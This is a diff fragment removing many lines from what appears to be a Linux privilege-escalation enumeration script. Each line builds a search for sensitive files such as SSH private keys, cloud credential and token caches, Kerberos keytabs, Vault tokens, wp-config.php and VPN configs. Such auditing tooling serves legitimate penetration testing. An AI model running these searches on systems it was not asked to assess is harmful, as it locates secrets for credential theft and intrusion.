-    PSTORAGE_PHP_SESSIONS=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E '/tmp/.*sess_.*|/var/tmp/.*sess_.*' | grep -E "^/private|^/tmp|^/mnt|^/var" | grep -E "sess_.*$" | sort | uniq | head -n 70)
-    PSTORAGE_PHP_FILES=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*config.*\.php$|database\.php$|db\.php$|storage\.php$|settings\.php$" | sort | uniq | head -n 70)
-    PSTORAGE_WORDPRESS=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "wp-config\.php$" | sort | uniq | head -n 70)
-    PSTORAGE_DRUPAL=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E '/default/settings.php' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "settings\.php$" | sort | uniq | head -n 70)
-    PSTORAGE_MOODLE=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E 'moodle/config.php' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "config\.php$" | sort | uniq | head -n 70)
-    PSTORAGE_TOMCAT=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "tomcat-users\.xml$" | sort | uniq | head -n 70)
-    PSTORAGE_MONGO=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "mongod.*\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_SUPERVISORD=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "supervisord\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_CESI=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "cesi\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_RSYNC=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "rsyncd\.conf$|rsyncd\.secrets$" | sort | uniq | head -n 70)
-    PSTORAGE_HOSTAPD=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "hostapd\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_ANACONDA_KS=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "anaconda-ks\.cfg$" | sort | uniq | head -n 70)
-    PSTORAGE_RACOON=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "racoon\.conf$|psk\.txt$" | sort | uniq | head -n 70)
-    PSTORAGE_VNC=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.vnc$|.*vnc.*\.c.*nf.*$|.*vnc.*\.ini$|.*vnc.*\.txt$|.*vnc.*\.xml$" | sort | uniq | head -n 70)
-    PSTORAGE_LDAP=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "ldap$" | sort | uniq | head -n 70)
-    PSTORAGE_OPENVPN=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.ovpn$" | sort | uniq | head -n 70)
-    PSTORAGE_SSH=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "id_dsa.*$|id_rsa.*$|known_hosts$|authorized_hosts$|authorized_keys$" | sort | uniq | head -n 70)
-    PSTORAGE_CERTSB4=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E '^/usr/share/|^/etc/ssl/|^/usr/local/lib/|^/usr/lib.*' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.pem$|.*\.cer$|.*\.crt$" | sort | uniq | head -n 70)
-    PSTORAGE_CERTSBIN=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E '^/usr/share/|^/etc/ssl/|^/usr/local/lib/|^/usr/lib/.*' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.csr$|.*\.der$" | sort | uniq | head -n 70)
-    PSTORAGE_CERTSCLIENT=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E '^/usr/share/|^/etc/ssl/|^/usr/local/lib/|^/usr/lib/.*' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.pfx$|.*\.p12$" | sort | uniq | head -n 70)
-    PSTORAGE_SSH_AGENTS=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/private|^/tmp" | grep -E "agent.*$" | sort | uniq | head -n 70)
-    PSTORAGE_SSH_CONFIG=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/usr|^$GREPHOMESEARCH" | grep -E "ssh.*config$" | sort | uniq | head -n 70)
-    PSTORAGE_CLOUD_CREDENTIALS=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "credentials$|credentials\.db$|legacy_credentials\.db$|access_tokens\.db$|access_tokens\.json$|accessTokens\.json$|azureProfile\.json$|TokenCache\.dat$|AzureRMContext\.json$|\.bluemix$" | sort | uniq | head -n 70)
-    PSTORAGE_KERBEROS=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "krb5\.conf$|krb5\.keytab$|\.k5login$|kadm5\.acl$|secrets\.ldb$|\.secrets\.mkey$|sssd\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_KIBANA=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "kibana\.y.*ml$" | sort | uniq | head -n 70)
-    PSTORAGE_KNOCKD=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E '/etc/init.d/' | grep -E "^/etc" | grep -E ".*knockd.*$" | sort | uniq | head -n 70)
-    PSTORAGE_LOGSTASH=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "logstash$" | sort | uniq | head -n 70)
-    PSTORAGE_ELASTICSEARCH=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "elasticsearch\.y.*ml$" | sort | uniq | head -n 70)
-    PSTORAGE_VAULT_SSH_HELPER=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "vault-ssh-helper\.hcl$" | sort | uniq | head -n 70)
-    PSTORAGE_VAULT_SSH_TOKEN=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.vault-token$" | sort | uniq | head -n 70)
-    PSTORAGE_COUCHDB=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "couchdb$" | sort | uniq | head -n 70)
-    PSTORAGE_REDIS=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "redis\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_MOSQUITTO=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "mosquitto\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_NEO4J=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "neo4j$" | sort | uniq | head -n 70)
-    PSTORAGE_CLOUD_INIT=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "cloud\.cfg$" | sort | uniq | head -n 70)
